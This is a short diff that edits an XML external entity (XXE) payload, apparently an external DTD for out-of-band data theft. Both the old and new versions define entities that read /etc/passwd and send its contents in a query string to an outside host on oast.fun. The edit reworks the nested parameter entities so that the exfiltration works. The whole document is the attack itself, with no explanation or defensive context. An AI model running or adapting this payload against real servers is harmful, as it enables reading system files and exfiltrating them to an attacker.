@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % encode "<![CDATA[%file;]]>">
-<!ENTITY % send "<!ENTITY exfil SYSTEM 'http://jbogwmzyhnnqmnbdpwqsu2sdb72du2hjq.oast.fun/?leak=%encode;'>">
-%send;
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://jbogwmzyhnnqmnbdpwqsu2sdb72du2hjq.oast.fun/?leak=%file;'>">
+%eval;
+%exfil;
